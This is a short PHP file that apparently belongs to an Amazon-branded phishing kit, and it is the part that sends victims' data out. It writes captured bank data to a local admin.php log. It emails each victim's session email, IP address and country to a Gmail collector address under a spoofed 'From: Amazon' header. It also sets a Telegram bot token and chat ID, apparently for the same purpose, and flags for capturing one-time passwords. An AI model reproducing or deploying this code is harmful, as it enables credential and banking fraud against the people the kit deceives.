<?php

$yourmail  = 'spamfazemrx@gmail.com';

$OTP = "ON";
$ACSEAMAIL = "ON";

$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);

$subject  = " ".$_SESSION['email']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";
$headers .= "From: Amazon" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);

$botToken="1745403573:AAHZ1CXhCwUr6LJXfcqRNvsDeGk3e3nkDxE";
$chatId="1793019696";  
